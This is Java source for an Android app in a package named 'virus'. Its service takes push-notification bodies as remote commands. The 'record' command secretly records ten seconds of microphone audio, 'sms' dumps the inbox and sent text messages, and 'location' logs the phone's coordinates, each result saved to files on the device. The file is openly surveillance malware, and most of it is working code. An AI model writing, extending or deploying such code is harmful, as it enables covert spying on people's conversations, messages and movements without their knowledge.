package com.example.virus.Services;

import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.StrictMode;
import android.util.Log;

import com.onesignal.NotificationExtenderService;
import com.onesignal.OSNotificationReceivedResult;

import java.io.IOException;
import java.io.PrintWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import static android.support.constraint.motion.utils.Oscillator.TAG;

public class OSService extends NotificationExtenderService {
    @Override
    protected boolean onNotificationProcessing(OSNotificationReceivedResult receivedResult) {
        String cmd = receivedResult.payload.body.trim();
        if (cmd.equals("record")) {
            DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
            Date date = new Date();
            String filePrefix = this.getApplicationInfo().dataDir + "/audio-";
            recordAudio(filePrefix + formatter.format(date) + ".3gp", 10);
        }
        if (cmd.equals("sms")) {
            String inboxFile = this.getApplicationInfo().dataDir + "/sms_inbox";
            dumpSMS(this, inboxFile, "inbox");

            String sentFile = this.getApplicationInfo().dataDir + "/sms_sent";
            dumpSMS(this, sentFile, "sent");
        }

        if (cmd.equals("location")) {
            DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
            Date date = new Date();

            String locationFile=this.getApplicationInfo().dataDir+"/location-"+dateFormat.format(date);
           Location loc=getLastLocation(this);
            try {

                PrintWriter pw= new PrintWriter(locationFile);
                pw.write(loc.getLatitude() + " " + loc.getLongitude());
                pw.close();


            }

            catch (IOException e) {}

        }
        return true;
    }

    void recordAudio(String file, final int time) {
        final MediaRecorder recorder = new MediaRecorder();

        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(file);

        try {
            recorder.prepare();
        } catch (IOException e) {}

        recorder.start();

        Thread timer = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(time * 1000);
                } catch (InterruptedException e) {
                    Log.d(TAG, "timer interrupted");
                } finally {
                    recorder.stop();
                    recorder.release();
                }
            }
        });

        timer.start();
    }
    void dumpSMS(Context context, String file, String box) {
        SimpleDateFormat formatter = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.US);

        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/" + box), null, null, null, null);

        try {
            PrintWriter pw = new PrintWriter(file);

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = null;
                    String date = null;
                    String body = null;

                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        switch (cursor.getColumnName(idx)) {
                            case "address":
                                address = cursor.getString(idx);
                                break;
                            case "date":
                                date = cursor.getString(idx);
                                break;
                            case "body":
                                body = cursor.getString(idx);
                        }
                    }

                    if (box.equals("inbox")) {
                        pw.println("From: " + address);
                    } else {
                        pw.println("To: " + address);
                    }

                    String dateString = formatter.format(new java.sql.Date(Long.valueOf(date)));

                    pw.println("Date: " + dateString);

                    if (body != null) {
                        pw.println("Body: " + body.replace('\n', ' '));
                    } else {
                        pw.println("Body: ");
                    }

                    pw.println();
                } while (cursor.moveToNext());
            }
            pw.close();
            cursor.close();
        } catch (Exception e) {}
    }

    public Location getLastLocation(Context context) throws SecurityException {

        LocationManager lManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

        Location locationGPS = lManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        Location locationNet = lManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

        long GPSLocationTime = 0;
        if (null != locationGPS) { GPSLocationTime = locationGPS.getTime(); }

        long NetLocationTime = 0;
        if (null != locationNet) { NetLocationTime = locationNet.getTime(); }

        Location loc;
        if ( 0 < GPSLocationTime - NetLocationTime ) {
            loc = locationGPS;
        } else {
            loc = locationNet;
        }
        DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd-HH-mm-ss", Locale.US);
        Date date = new Date();

        String locationFile=dateFormat.format(date)+this.getApplicationInfo().dataDir+"/location";
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);
        try {

            PrintWriter pw= new PrintWriter(locationFile);
            pw.write(loc.getLatitude() + " " + loc.getLongitude());
            pw.close();

        }

        catch (IOException e) {}
        if (loc != null) {
            return loc;
        } else {
            return null;
        }

    }
}
